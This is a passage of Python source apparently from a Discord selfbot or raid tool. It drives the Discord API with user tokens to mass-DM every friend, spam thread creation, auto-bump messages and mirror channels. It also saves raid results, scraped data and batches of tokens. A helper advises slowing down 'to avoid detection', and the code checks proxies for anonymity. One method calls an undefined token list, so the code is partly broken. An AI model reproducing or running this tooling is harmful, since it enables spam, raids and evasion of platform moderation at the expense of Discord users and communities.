                f"https://discord.com/api/v9/users/@me/relationships/{user_id}"
            )
            if res.status_code == 204:
                console.log("Removed", C["green"], "Friend", user_id)
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Remove Friend", str(e))
            return False
    
    def get_all_friends(self):
        """Get all friends"""
        try:
            res = self.session.get("https://discord.com/api/v9/users/@me/relationships")
            if res.status_code == 200:
                relationships = res.json()
                friends = [r for r in relationships if r.get("type") == 1]
                console.log("Found", C["cyan"], f"{len(friends)} friends")
                return friends
            return []
        except Exception as e:
            console.log("Error", C["red"], "Get Friends", str(e))
            return []
    
    def mass_dm_friends(self, message, delay=2):
        """Send DM to all friends"""
        friends = self.get_all_friends()
        sent = 0
        
        for friend in friends:
            try:
                # Create DM channel
                dm_payload = {"recipients": [friend["id"]]}
                dm_res = self.session.post(
                    "https://discord.com/api/v9/users/@me/channels",
                    json=dm_payload
                )
                
                if dm_res.status_code == 200:
                    dm_channel = dm_res.json()
                    
                    # Send message
                    msg_payload = {"content": message}
                    msg_res = self.session.post(
                        f"https://discord.com/api/v9/channels/{dm_channel['id']}/messages",
                        json=msg_payload
                    )
                    
                    if msg_res.status_code == 200:
                        sent += 1
                        console.log("Sent", C["green"], f"DM to {friend['user']['username']}", f"#{sent}")
                
                time.sleep(delay)
            except Exception as e:
                console.log("Error", C["red"], f"DM to {friend.get('id', 'Unknown')}", str(e)[:30])
        
        console.log("Complete", C["cyan"], "Mass DM Friends", f"{sent}/{len(friends)} sent")
        return sent
    
    def create_thread(self, channel_id, name, message_id=None):
        """Create a thread"""
        try:
            if message_id:
                # Create thread from message
                payload = {"name": name}
                res = self.session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/threads",
                    json=payload
                )
            else:
                # Create standalone thread
                payload = {
                    "name": name,
                    "type": 11,  # Public thread
                    "auto_archive_duration": 1440
                }
                res = self.session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/threads",
                    json=payload
                )
            
            if res.status_code == 201:
                thread = res.json()
                console.log("Created", C["green"], "Thread", name)
                return thread
            return None
        except Exception as e:
            console.log("Error", C["red"], "Thread Creation", str(e))
            return None
    
    def spam_threads(self, channel_id, count=10, prefix="Thread"):
        """Create multiple threads"""
        created = 0
        for i in range(count):
            thread = self.create_thread(channel_id, f"{prefix}-{i+1}")
            if thread:
                created += 1
            time.sleep(0.5)
        
        console.log("Complete", C["cyan"], "Thread Spam", f"{created}/{count} created")
        return created
    
    def join_thread(self, thread_id):
        """Join a thread"""
        try:
            res = self.session.put(
                f"https://discord.com/api/v9/channels/{thread_id}/thread-members/@me"
            )
            if res.status_code == 204:
                console.log("Joined", C["green"], "Thread", thread_id)
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Thread Join", str(e))
            return False
    
    def leave_thread(self, thread_id):
        """Leave a thread"""
        try:
            res = self.session.delete(
                f"https://discord.com/api/v9/channels/{thread_id}/thread-members/@me"
            )
            if res.status_code == 204:
                console.log("Left", C["green"], "Thread", thread_id)
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Thread Leave", str(e))
            return False
    
    def pin_message(self, channel_id, message_id):
        """Pin a message"""
        try:
            res = self.session.put(
                f"https://discord.com/api/v9/channels/{channel_id}/pins/{message_id}"
            )
            if res.status_code == 204:
                console.log("Pinned", C["green"], "Message", message_id)
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Pin Message", str(e))
            return False
    
    def unpin_message(self, channel_id, message_id):
        """Unpin a message"""
        try:
            res = self.session.delete(
                f"https://discord.com/api/v9/channels/{channel_id}/pins/{message_id}"
            )
            if res.status_code == 204:
                console.log("Unpinned", C["green"], "Message", message_id)
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Unpin Message", str(e))
            return False

# ═══════════════════════════════════════════════════════════════════════════════
# AUTOMATION ENGINE CLASS - Advanced Task Automation
# ═══════════════════════════════════════════════════════════════════════════════

class AutomationEngine:
    """Advanced automation and scheduling system"""
    
    def __init__(self, token):
        self.token = token
        self.session = requests.Session()
        self.session.headers.update({"Authorization": token})
        self.tasks = []
        self.running = False
    
    def add_scheduled_task(self, task_func, interval, *args, **kwargs):
        """Add a scheduled task"""
        task = {
            "function": task_func,
            "interval": interval,
            "args": args,
            "kwargs": kwargs,
            "last_run": 0
        }
        self.tasks.append(task)
        console.log("Added", C["green"], "Scheduled Task", f"Interval: {interval}s")
        return len(self.tasks) - 1
    
    def remove_task(self, task_id):
        """Remove a scheduled task"""
        if 0 <= task_id < len(self.tasks):
            self.tasks.pop(task_id)
            console.log("Removed", C["green"], "Task", f"ID: {task_id}")
            return True
        return False
    
    def start_automation(self):
        """Start automation engine"""
        self.running = True
        console.log("Started", C["cyan"], "Automation Engine", f"{len(self.tasks)} tasks")
        
        while self.running and not STRIKE_EVENT.is_set():
            current_time = time.time()
            
            for task in self.tasks:
                if current_time - task["last_run"] >= task["interval"]:
                    try:
                        task["function"](*task["args"], **task["kwargs"])
                        task["last_run"] = current_time
                    except Exception as e:
                        console.log("Error", C["red"], "Task Execution", str(e)[:50])
            
            time.sleep(1)
        
        console.log("Stopped", C["yellow"], "Automation Engine")
    
    def stop_automation(self):
        """Stop automation engine"""
        self.running = False
    
    def auto_responder(self, channel_id, trigger_words, response, case_sensitive=False):
        """Auto-respond to messages containing trigger words"""
        console.log("Started", C["cyan"], "Auto Responder", f"{len(trigger_words)} triggers")
        
        last_message_id = None
        
        while not STRIKE_EVENT.is_set():
            try:
                res = self.session.get(f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=1")
                if res.status_code == 200:
                    messages = res.json()
                    if messages and messages[0]["id"] != last_message_id:
                        message = messages[0]
                        last_message_id = message["id"]
                        
                        content = message["content"]
                        if not case_sensitive:
                            content = content.lower()
                            trigger_words = [w.lower() for w in trigger_words]
                        
                        if any(trigger in content for trigger in trigger_words):
                            # Send response
                            payload = {"content": response}
                            self.session.post(
                                f"https://discord.com/api/v9/channels/{channel_id}/messages",
                                json=payload
                            )
                            console.log("Responded", C["green"], "Auto Response", content[:30])
                
                time.sleep(2)
            except Exception as e:
                console.log("Error", C["red"], "Auto Responder", str(e)[:30])
                time.sleep(5)
        
        console.log("Stopped", C["yellow"], "Auto Responder")
    
    def auto_react(self, channel_id, emojis, delay=1):
        """Auto-react to new messages"""
        console.log("Started", C["cyan"], "Auto React", f"{len(emojis)} emojis")
        
        last_message_id = None
        
        while not STRIKE_EVENT.is_set():
            try:
                res = self.session.get(f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=1")
                if res.status_code == 200:
                    messages = res.json()
                    if messages and messages[0]["id"] != last_message_id:
                        message_id = messages[0]["id"]
                        last_message_id = message_id
                        
                        for emoji in emojis:
                            self.session.put(
                                f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me"
                            )
                            time.sleep(0.3)
                        
                        console.log("Reacted", C["green"], "Auto React", f"{len(emojis)} reactions")
                
                time.sleep(delay)
            except Exception as e:
                console.log("Error", C["red"], "Auto React", str(e)[:30])
                time.sleep(5)
        
        console.log("Stopped", C["yellow"], "Auto React")
    
    def message_mirror(self, source_channel_id, target_channel_id, delay=1):
        """Mirror messages from one channel to another"""
        console.log("Started", C["cyan"], "Message Mirror", f"{source_channel_id} -> {target_channel_id}")
        
        last_message_id = None
        
        while not STRIKE_EVENT.is_set():
            try:
                res = self.session.get(f"https://discord.com/api/v9/channels/{source_channel_id}/messages?limit=1")
                if res.status_code == 200:
                    messages = res.json()
                    if messages and messages[0]["id"] != last_message_id:
                        message = messages[0]
                        last_message_id = message["id"]
                        
                        # Mirror message
                        payload = {"content": message["content"]}
                        if message.get("embeds"):
                            payload["embeds"] = message["embeds"]
                        
                        self.session.post(
                            f"https://discord.com/api/v9/channels/{target_channel_id}/messages",
                            json=payload
                        )
                        console.log("Mirrored", C["green"], "Message", message["content"][:30])
                
                time.sleep(delay)
            except Exception as e:
                console.log("Error", C["red"], "Message Mirror", str(e)[:30])
                time.sleep(5)
        
        console.log("Stopped", C["yellow"], "Message Mirror")
    
    def auto_delete_messages(self, channel_id, delay=5):
        """Auto-delete own messages after delay"""
        console.log("Started", C["cyan"], "Auto Delete", f"Delay: {delay}s")
        
        message_queue = []
        
        def delete_worker():
            while not STRIKE_EVENT.is_set():
                current_time = time.time()
                for msg in message_queue[:]:
                    if current_time - msg["timestamp"] >= delay:
                        try:
                            self.session.delete(
                                f"https://discord.com/api/v9/channels/{channel_id}/messages/{msg['id']}"
                            )
                            console.log("Deleted", C["green"], "Message", msg["id"])
                            message_queue.remove(msg)
                        except:
                            pass
                time.sleep(1)
        
        threading.Thread(target=delete_worker, daemon=True).start()
        
        # Monitor for new messages
        last_message_id = None
        while not STRIKE_EVENT.is_set():
            try:
                res = self.session.get(f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=1")
                if res.status_code == 200:
                    messages = res.json()
                    if messages and messages[0]["id"] != last_message_id:
                        message = messages[0]
                        last_message_id = message["id"]
                        
                        # Check if it's our message
                        user_res = self.session.get("https://discord.com/api/v9/users/@me")
                        if user_res.status_code == 200:
                            user_id = user_res.json()["id"]
                            if message["author"]["id"] == user_id:
                                message_queue.append({
                                    "id": message["id"],
                                    "timestamp": time.time()
                                })
                
                time.sleep(1)
            except Exception as e:
                console.log("Error", C["red"], "Auto Delete", str(e)[:30])
                time.sleep(5)
        
        console.log("Stopped", C["yellow"], "Auto Delete")
    
    def role_automation(self, guild_id, role_id, action="add", target_type="new_members"):
        """Automate role assignment"""
        console.log("Started", C["cyan"], "Role Automation", f"Action: {action}")
        
        known_members = set()
        
        while not STRIKE_EVENT.is_set():
            try:
                res = self.session.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000")
                if res.status_code == 200:
                    members = res.json()
                    
                    for member in members:
                        member_id = member["user"]["id"]
                        
                        if target_type == "new_members" and member_id not in known_members:
                            known_members.add(member_id)
                            
                            if action == "add":
                                self.session.put(
                                    f"https://discord.com/api/v9/guilds/{guild_id}/members/{member_id}/roles/{role_id}"
                                )
                                console.log("Added", C["green"], f"Role to {member['user']['username']}")
                            elif action == "remove":
                                self.session.delete(
                                    f"https://discord.com/api/v9/guilds/{guild_id}/members/{member_id}/roles/{role_id}"
                                )
                                console.log("Removed", C["green"], f"Role from {member['user']['username']}")
                
                time.sleep(10)
            except Exception as e:
                console.log("Error", C["red"], "Role Automation", str(e)[:30])
                time.sleep(15)
        
        console.log("Stopped", C["yellow"], "Role Automation")
    
    def channel_monitor(self, channel_id, keywords, alert_channel_id=None):
        """Monitor channel for specific keywords"""
        console.log("Started", C["cyan"], "Channel Monitor", f"{len(keywords)} keywords")
        
        last_message_id = None
        
        while not STRIKE_EVENT.is_set():
            try:
                res = self.session.get(f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=5")
                if res.status_code == 200:
                    messages = res.json()
                    
                    for message in messages:
                        if message["id"] != last_message_id:
                            content = message["content"].lower()
                            
                            for keyword in keywords:
                                if keyword.lower() in content:
                                    console.log("ALERT", C["red"], f"Keyword detected: {keyword}", content[:50])
                                    
                                    if alert_channel_id:
                                        alert_payload = {
                                            "content": f"🚨 **KEYWORD ALERT** 🚨\nKeyword: `{keyword}`\nMessage: {content[:100]}\nChannel: <#{channel_id}>"
                                        }
                                        self.session.post(
                                            f"https://discord.com/api/v9/channels/{alert_channel_id}/messages",
                                            json=alert_payload
                                        )
                    
                    if messages:
                        last_message_id = messages[0]["id"]
                
                time.sleep(3)
            except Exception as e:
                console.log("Error", C["red"], "Channel Monitor", str(e)[:30])
                time.sleep(5)
        
        console.log("Stopped", C["yellow"], "Channel Monitor")
    
    def auto_bump(self, channel_id, message, interval=7200):
        """Auto-bump message at intervals"""
        console.log("Started", C["cyan"], "Auto Bump", f"Interval: {interval}s")
        
        while not STRIKE_EVENT.is_set():
            for i, token in enumerate(self.tokens):
                if STRIKE_EVENT.is_set(): break
                try:
                    payload = {"content": message}
                    res = req_session.post(
                        f"https://discord.com/api/v9/channels/{channel_id}/messages",
                        headers={"Authorization": token},
                        json=payload
                    )
                    if res.status_code == 200:
                        console.log("Bumped", C["green"], "Message", message[:30])
                    
                    time.sleep(interval)
                except Exception as e:
                    console.log("Error", C["red"], "Auto Bump", str(e)[:30])
                    time.sleep(60)
        
        console.log("Stopped", C["yellow"], "Auto Bump")

# ═══════════════════════════════════════════════════════════════════════════════
# ERROR HANDLER CLASS - Advanced Error Management
# ═══════════════════════════════════════════════════════════════════════════════

class ErrorHandler:
    """Advanced error handling and recovery system"""
    
    def __init__(self):
        self.error_log = []
        self.error_counts = {}
        self.rate_limit_tracker = {}
    
    def log_error(self, error_type, error_message, context=None):
        """Log an error with context"""
        error_entry = {
            "type": error_type,
            "message": error_message,
            "context": context,
            "timestamp": time.time()
        }
        self.error_log.append(error_entry)
        
        # Update error counts
        if error_type not in self.error_counts:
            self.error_counts[error_type] = 0
        self.error_counts[error_type] += 1
        
        console.log("ERROR", C["red"], error_type, error_message[:50])
    
    def handle_rate_limit(self, endpoint, retry_after=None):
        """Handle rate limit errors"""
        if retry_after:
            wait_time = float(retry_after)
        else:
            wait_time = 5
        
        self.rate_limit_tracker[endpoint] = time.time() + wait_time
        console.log("RATE LIMIT", C["yellow"], endpoint, f"Retry after {wait_time}s")
        time.sleep(wait_time)
    
    def is_rate_limited(self, endpoint):
        """Check if endpoint is rate limited"""
        if endpoint in self.rate_limit_tracker:
            if time.time() < self.rate_limit_tracker[endpoint]:
                return True
            else:
                del self.rate_limit_tracker[endpoint]
        return False
    
    def retry_with_backoff(self, func, max_retries=3, base_delay=1, *args, **kwargs):
        """Retry function with exponential backoff"""
        for attempt in range(max_retries):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                if attempt == max_retries - 1:
                    self.log_error("RETRY_FAILED", str(e), {"function": func.__name__, "attempts": max_retries})
                    raise e
                
                delay = base_delay * (2 ** attempt)
                console.log("RETRY", C["yellow"], f"Attempt {attempt + 1}/{max_retries}", f"Waiting {delay}s")
                time.sleep(delay)
        
        return None
    
    def get_error_statistics(self):
        """Get error statistics"""
        total_errors = len(self.error_log)
        recent_errors = [e for e in self.error_log if time.time() - e["timestamp"] < 3600]  # Last hour
        
        stats = {
            "total_errors": total_errors,
            "recent_errors": len(recent_errors),
            "error_types": self.error_counts,
            "rate_limited_endpoints": len(self.rate_limit_tracker)
        }
        
        return stats
    
    def display_error_report(self):
        """Display error report"""
        stats = self.get_error_statistics()
        
        console.log("ERROR REPORT", C["red"], "═" * 60)
        console.log("TOTAL ERRORS", C["white"], str(stats["total_errors"]))
        console.log("RECENT ERRORS (1H)", C["yellow"], str(stats["recent_errors"]))
        console.log("RATE LIMITED", C["yellow"], str(stats["rate_limited_endpoints"]))
        
        if stats["error_types"]:
            console.log("ERROR BREAKDOWN", C["cyan"], "")
            for error_type, count in stats["error_types"].items():
                console.log(f"  {error_type}", C["white"], str(count))
        
        console.log("═" * 70, C["red"])
    
    def export_error_log(self, filename="data/error_log.json"):
        """Export error log to file"""
        return AdvancedUtils.export_to_json(self.error_log, filename)
    
    def clear_old_errors(self, max_age=86400):
        """Clear errors older than max_age seconds"""
        current_time = time.time()
        self.error_log = [e for e in self.error_log if current_time - e["timestamp"] < max_age]
        console.log("Cleared", C["green"], "Old Errors", f"{len(self.error_log)} remaining")

# ═══════════════════════════════════════════════════════════════════════════════
# DATA PERSISTENCE CLASS - Save/Load Operations
# ═══════════════════════════════════════════════════════════════════════════════

class DataPersistence:
    """Data persistence and storage management"""
    
    def __init__(self, base_dir="data"):
        self.base_dir = base_dir
        os.makedirs(base_dir, exist_ok=True)
    
    def save_session_data(self, session_name, data):
        """Save session data"""
        filepath = os.path.join(self.base_dir, f"session_{session_name}.json")
        if AdvancedUtils.export_to_json(data, filepath):
            console.log("Saved", C["green"], "Session Data", session_name)
            return True
        return False
    
    def load_session_data(self, session_name):
        """Load session data"""
        filepath = os.path.join(self.base_dir, f"session_{session_name}.json")
        data = AdvancedUtils.load_backup(filepath)
        if data:
            console.log("Loaded", C["green"], "Session Data", session_name)
        return data
    
    def save_raid_results(self, raid_name, results):
        """Save raid results"""
        filepath = os.path.join(self.base_dir, f"raid_{raid_name}_{int(time.time())}.json")
        if AdvancedUtils.export_to_json(results, filepath):
            console.log("Saved", C["green"], "Raid Results", raid_name)
            return filepath
        return None
    
    def save_scraped_data(self, data_type, data):
        """Save scraped data"""
        os.makedirs(os.path.join(self.base_dir, "scraped"), exist_ok=True)
        filepath = os.path.join(self.base_dir, "scraped", f"{data_type}_{int(time.time())}.json")
        if AdvancedUtils.export_to_json(data, filepath):
            console.log("Saved", C["green"], "Scraped Data", data_type)
            return filepath
        return None
    
    def save_tokens_batch(self, tokens, batch_name="batch"):
        """Save tokens to batch file"""
        filepath = os.path.join(self.base_dir, f"tokens_{batch_name}.txt")
        try:
            with open(filepath, 'w') as f:
                f.write('\n'.join(tokens))
            console.log("Saved", C["green"], f"{len(tokens)} tokens", batch_name)
            return True
        except Exception as e:
            console.log("Error", C["red"], "Save Tokens", str(e))
            return False
    
    def load_tokens_batch(self, batch_name="batch"):
        """Load tokens from batch file"""
        filepath = os.path.join(self.base_dir, f"tokens_{batch_name}.txt")
        try:
            with open(filepath, 'r') as f:
                tokens = [line.strip() for line in f.readlines() if line.strip()]
            console.log("Loaded", C["green"], f"{len(tokens)} tokens", batch_name)
            return tokens
        except Exception as e:
            console.log("Error", C["red"], "Load Tokens", str(e))
            return []
    
    def create_backup(self, backup_name=None):
        """Create full backup of data directory"""
        if not backup_name:
            backup_name = f"backup_{int(time.time())}"
        
        backup_dir = os.path.join(self.base_dir, "backups", backup_name)
        os.makedirs(backup_dir, exist_ok=True)
        
        try:
            import shutil
            shutil.copytree(self.base_dir, backup_dir, dirs_exist_ok=True)
            console.log("Created", C["green"], "Full Backup", backup_name)
            return backup_dir
        except Exception as e:
            console.log("Error", C["red"], "Backup Creation", str(e))
            return None
    
    def list_backups(self):
        """List all available backups"""
        backup_dir = os.path.join(self.base_dir, "backups")
        if os.path.exists(backup_dir):
            backups = [d for d in os.listdir(backup_dir) if os.path.isdir(os.path.join(backup_dir, d))]
            console.log("Found", C["cyan"], f"{len(backups)} backups")
            return backups
        return []
    
    def export_statistics(self, stats, export_name="statistics"):
        """Export statistics to file"""
        filepath = os.path.join(self.base_dir, f"{export_name}_{int(time.time())}.json")
        return AdvancedUtils.export_to_json(stats, filepath)

# ═══════════════════════════════════════════════════════════════════════════════
# ADVANCED LOGGER CLASS - Comprehensive Logging System
# ═══════════════════════════════════════════════════════════════════════════════

class AdvancedLogger:
    """Advanced logging system with multiple output formats"""
    
    def __init__(self, log_dir="data/logs"):
        self.log_dir = log_dir
        os.makedirs(log_dir, exist_ok=True)
        self.session_id = int(time.time())
        self.log_entries = []
    
    def log(self, level, category, message, details=None):
        """Log an entry"""
        entry = {
            "timestamp": time.time(),
            "level": level,
            "category": category,
            "message": message,
            "details": details
        }
        self.log_entries.append(entry)
        
        # Also print to console
        color_map = {
            "INFO": C["cyan"],
            "SUCCESS": C["green"],
            "WARNING": C["yellow"],
            "ERROR": C["red"],
            "CRITICAL": C["magenta"]
        }
        console.log(category, color_map.get(level, C["white"]), message, str(details) if details else "")
    
    def info(self, category, message, details=None):
        """Log info message"""
        self.log(level="INFO", category=category, message=message, details=details)
    
    def success(self, category, message, details=None):
        """Log success message"""
        self.log("SUCCESS", category, message, details)
    
    def warning(self, category, message, details=None):
        """Log warning message"""
        self.log("WARNING", category, message, details)
    
    def error(self, category, message, details=None):
        """Log error message"""
        self.log("ERROR", category, message, details)
    
    def critical(self, category, message, details=None):
        """Log critical message"""
        self.log("CRITICAL", category, message, details)
    
    def save_log(self, filename=None):
        """Save log to file"""
        if not filename:
            filename = f"session_{self.session_id}.log"
        
        filepath = os.path.join(self.log_dir, filename)
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                for entry in self.log_entries:
                    timestamp_str = datetime.datetime.fromtimestamp(entry["timestamp"]).strftime("%Y-%m-%d %H:%M:%S")
                    f.write(f"[{timestamp_str}] [{entry['level']}] {entry['category']}: {entry['message']}\n")
                    if entry['details']:
                        f.write(f"  Details: {entry['details']}\n")
            
            console.log("Saved", C["green"], "Log File", filename)
            return filepath
        except Exception as e:
            console.log("Error", C["red"], "Save Log", str(e))
            return None
    
    def export_json_log(self, filename=None):
        """Export log as JSON"""
        if not filename:
            filename = f"session_{self.session_id}.json"
        
        filepath = os.path.join(self.log_dir, filename)
        return AdvancedUtils.export_to_json(self.log_entries, filepath)
    
    def get_log_statistics(self):
        """Get log statistics"""
        level_counts = {}
        category_counts = {}
        
        for entry in self.log_entries:
            level = entry["level"]
            category = entry["category"]
            
            level_counts[level] = level_counts.get(level, 0) + 1
            category_counts[category] = category_counts.get(category, 0) + 1
        
        return {
            "total_entries": len(self.log_entries),
            "by_level": level_counts,
            "by_category": category_counts
        }
    
    def display_log_summary(self):
        """Display log summary"""
        stats = self.get_log_statistics()
        
        console.log("LOG SUMMARY", C["cyan"], "═" * 60)
        console.log("TOTAL ENTRIES", C["white"], str(stats["total_entries"]))
        
        console.log("BY LEVEL", C["cyan"], "")
        for level, count in stats["by_level"].items():
            console.log(f"  {level}", C["white"], str(count))
        
        console.log("TOP CATEGORIES", C["cyan"], "")
        sorted_categories = sorted(stats["by_category"].items(), key=lambda x: x[1], reverse=True)[:10]
        for category, count in sorted_categories:
            console.log(f"  {category}", C["white"], str(count))
        
        console.log("═" * 70, C["cyan"])

# ═══════════════════════════════════════════════════════════════════════════════
# PERFORMANCE MONITOR CLASS - System Performance Tracking
# ═══════════════════════════════════════════════════════════════════════════════

class PerformanceMonitor:
    """Monitor and track system performance metrics"""
    
    def __init__(self):
        self.metrics = {
            "requests_sent": 0,
            "requests_failed": 0,
            "bytes_sent": 0,
            "bytes_received": 0,
            "start_time": time.time()
        }
        self.operation_times = {}
    
    def record_request(self, success=True, bytes_sent=0, bytes_received=0):
        """Record a request"""
        self.metrics["requests_sent"] += 1
        if not success:
            self.metrics["requests_failed"] += 1
        self.metrics["bytes_sent"] += bytes_sent
        self.metrics["bytes_received"] += bytes_received
    
    def start_operation(self, operation_name):
        """Start timing an operation"""
        if operation_name not in self.operation_times:
            self.operation_times[operation_name] = []
        return time.time()
    
    def end_operation(self, operation_name, start_time):
        """End timing an operation"""
        duration = time.time() - start_time
        if operation_name in self.operation_times:
            self.operation_times[operation_name].append(duration)
        return duration
    
    def get_operation_stats(self, operation_name):
        """Get statistics for an operation"""
        if operation_name not in self.operation_times or not self.operation_times[operation_name]:
            return None
        
        times = self.operation_times[operation_name]
        return {
            "count": len(times),
            "total_time": sum(times),
            "avg_time": sum(times) / len(times),
            "min_time": min(times),
            "max_time": max(times)
        }
    
    def get_performance_metrics(self):
        """Get all performance metrics"""
        uptime = time.time() - self.metrics["start_time"]
        success_rate = ((self.metrics["requests_sent"] - self.metrics["requests_failed"]) / 
                       self.metrics["requests_sent"] * 100) if self.metrics["requests_sent"] > 0 else 0
        
        return {
            "uptime": uptime,
            "requests_sent": self.metrics["requests_sent"],
            "requests_failed": self.metrics["requests_failed"],
            "success_rate": success_rate,
            "bytes_sent": self.metrics["bytes_sent"],
            "bytes_received": self.metrics["bytes_received"],
            "requests_per_second": self.metrics["requests_sent"] / uptime if uptime > 0 else 0
        }
    
    def display_performance_report(self):
        """Display performance report"""
        metrics = self.get_performance_metrics()
        
        console.log("PERFORMANCE REPORT", C["cyan"], "═" * 60)
        console.log("UPTIME", C["white"], AdvancedUtils.format_duration(metrics["uptime"]))
        console.log("REQUESTS SENT", C["white"], str(metrics["requests_sent"]))
        console.log("REQUESTS FAILED", C["red"], str(metrics["requests_failed"]))
        console.log("SUCCESS RATE", C["green"], f"{metrics['success_rate']:.1f}%")
        console.log("DATA SENT", C["cyan"], AdvancedUtils.format_file_size(metrics["bytes_sent"]))
        console.log("DATA RECEIVED", C["cyan"], AdvancedUtils.format_file_size(metrics["bytes_received"]))
        console.log("REQ/SEC", C["magenta"], f"{metrics['requests_per_second']:.2f}")
        
        if self.operation_times:
            console.log("TOP OPERATIONS", C["cyan"], "")
            for op_name, times in list(self.operation_times.items())[:5]:
                stats = self.get_operation_stats(op_name)
                console.log(f"  {op_name}", C["white"], 
                           f"Count: {stats['count']} | Avg: {stats['avg_time']:.3f}s")
        
        console.log("═" * 70, C["cyan"])
    
    def export_metrics(self, filename="data/performance_metrics.json"):
        """Export performance metrics"""
        metrics = self.get_performance_metrics()
        metrics["operation_stats"] = {
            op: self.get_operation_stats(op) 
            for op in self.operation_times.keys()
        }
        return AdvancedUtils.export_to_json(metrics, filename)

# ═══════════════════════════════════════════════════════════════════════════════
# SECURITY UTILITIES CLASS - Security and Validation
# ═══════════════════════════════════════════════════════════════════════════════

class SecurityUtilities:
    """Security utilities and validation functions"""
    
    @staticmethod
    def validate_token_format(token):
        """Validate Discord token format"""
        # Discord tokens are base64 encoded and have specific patterns
        if not token or len(token) < 50:
            return False
        
        # Check for basic structure
        parts = token.split('.')
        if len(parts) != 3:
            return False
        
        return True
    
    @staticmethod
    def sanitize_input(user_input, max_length=2000):
        """Sanitize user input"""
        if not user_input:
            return ""
        
        # Remove potentially dangerous characters
        sanitized = user_input[:max_length]
        dangerous_chars = ['<script>', '</script>', '<iframe>', '</iframe>']
        
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        
        return sanitized
    
    @staticmethod
    def check_token_security(token):
        """Check token security level"""
        try:
            # Use global stealth session instead of requests.Session()
            res = req_session.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
            if res.status_code == 200:
                data = res.json()
                
                security_score = 0
                issues = []
                
                # Check 2FA
                if data.get("mfa_enabled"):
                    security_score += 30
                else:
                    issues.append("2FA not enabled")
                
                # Check email verification
                if data.get("verified"):
                    security_score += 20
                else:
                    issues.append("Email not verified")
                
                # Check phone verification
                if data.get("phone"):
                    security_score += 25
                else:
                    issues.append("Phone not verified")
                
                # Check account age
                user_id = data.get("id")
                if user_id:
                    timestamp = ((int(user_id) >> 22) + 1420070400000) / 1000
                    account_age_days = (time.time() - timestamp) / 86400
                    if account_age_days > 30:
                        security_score += 25
                    else:
                        issues.append(f"Account too new ({int(account_age_days)} days)")
                
                return {
                    "score": security_score,
                    "level": "HIGH" if security_score >= 75 else "MEDIUM" if security_score >= 50 else "LOW",
                    "issues": issues
                }
            
            return {"score": 0, "level": "UNKNOWN", "issues": ["Cannot verify token"]}
        except Exception as e:
            return {"score": 0, "level": "ERROR", "issues": [str(e)]}
    
    @staticmethod
    def detect_suspicious_activity(action_count, time_window=60, threshold=50):
        """Detect suspicious activity patterns"""
        rate = action_count / time_window
        
        if rate > threshold:
            return {
                "suspicious": True,
                "rate": rate,
                "threshold": threshold,
                "recommendation": "Slow down to avoid detection"
            }
        
        return {
            "suspicious": False,
            "rate": rate,
            "threshold": threshold
        }
    
    @staticmethod
    def generate_secure_password(length=16):
        """Generate a secure random password"""
        import string
        import secrets
        
        alphabet = string.ascii_letters + string.digits + string.punctuation
        password = ''.join(secrets.choice(alphabet) for _ in range(length))
        return password
    
    @staticmethod
    def check_proxy_security(proxy):
        """Check proxy security and anonymity"""
        try:
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            
            # Test proxy
            res = requests.get("https://api.ipify.org?format=json", proxies=proxies, timeout=5)
            if res.status_code == 200:
                proxy_ip = res.json().get("ip")
                
                # Check if proxy is working
                return {
                    "working": True,
                    "ip": proxy_ip,
                    "secure": True
                }
            
            return {"working": False, "secure": False}
        except Exception as e:
            return {"working": False, "secure": False, "error": str(e)}
    
    @staticmethod
    def encrypt_data(data, key=None):
        """Simple XOR encryption for data"""
        if not key:
            key = "ASTRO-NEXUS-2026"
        
        encrypted = []
        for i, char in enumerate(str(data)):
            key_char = key[i % len(key)]
            encrypted_char = chr(ord(char) ^ ord(key_char))
            encrypted.append(encrypted_char)
        
        return ''.join(encrypted)
    
    @staticmethod
    def decrypt_data(encrypted_data, key=None):
        """Simple XOR decryption for data"""
        # XOR encryption is symmetric
        return SecurityUtilities.encrypt_data(encrypted_data, key)
    
    @staticmethod
    def validate_webhook_url(url):
        """Validate webhook URL security"""
        if not AdvancedUtils.validate_webhook_url(url):
            return {"valid": False, "reason": "Invalid format"}
        
        # Check if webhook is accessible
        try:
            res = requests.get(url)
            if res.status_code == 200:
                return {"valid": True, "accessible": True}
            return {"valid": True, "accessible": False, "status": res.status_code}
        except Exception as e:
            return {"valid": True, "accessible": False, "error": str(e)}
    
    @staticmethod
    def scan_for_threats(text):
        """Scan text for potential threats"""
        threats = []
        
        # Check for common malicious patterns
        malicious_patterns = [
            (r'<script.*?>', "XSS Script Tag"),
            (r'javascript:', "JavaScript Protocol"),
            (r'eval\(', "Eval Function"),
            (r'exec\(', "Exec Function"),
            (r'\.\./', "Directory Traversal"),
            (r'<iframe', "Iframe Injection")
        ]
        
        for pattern, threat_name in malicious_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                threats.append(threat_name)
        
        return {
            "safe": len(threats) == 0,
            "threats_found": threats,
            "threat_count": len(threats)
        }
    
    @staticmethod
    def rate_limit_calculator(requests_per_minute, burst_size=5):
        """Calculate optimal rate limiting"""
        delay_between_requests = 60 / requests_per_minute
        burst_delay = delay_between_requests / burst_size
        
        return {
            "delay_between_requests": delay_between_requests,
            "burst_delay": burst_delay,
            "safe_rpm": requests_per_minute,
            "recommendation": f"Wait {delay_between_requests:.2f}s between requests"
        }

# ═══════════════════════════════════════════════════════════════════════════════
# COMPREHENSIVE UTILITIES CLASS - Final Massive Utility Collection
# ═══════════════════════════════════════════════════════════════════════════════

class ComprehensiveUtilities:
    """Comprehensive collection of utility functions for all operations"""
    
